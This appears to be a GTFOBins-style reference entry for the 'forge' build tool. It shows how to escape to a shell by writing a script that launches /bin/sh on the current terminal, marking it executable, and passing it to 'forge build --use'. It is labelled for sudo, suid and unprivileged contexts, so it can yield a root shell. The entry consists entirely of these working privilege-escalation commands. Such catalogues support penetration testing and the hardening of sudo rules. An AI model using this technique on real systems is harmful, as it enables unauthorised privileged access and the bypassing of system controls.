title: forge
html:
forge

Shell

Context: sudo, suid, unprivileged

echo '#!/bin/sh' >/path/to/temp-file
echo -e "/bin/sh <$(tty) >$(tty) 2>$(tty)" >>/path/to/temp-file
chmod +x /path/to/temp-file
forge build --use /path/to/temp-file
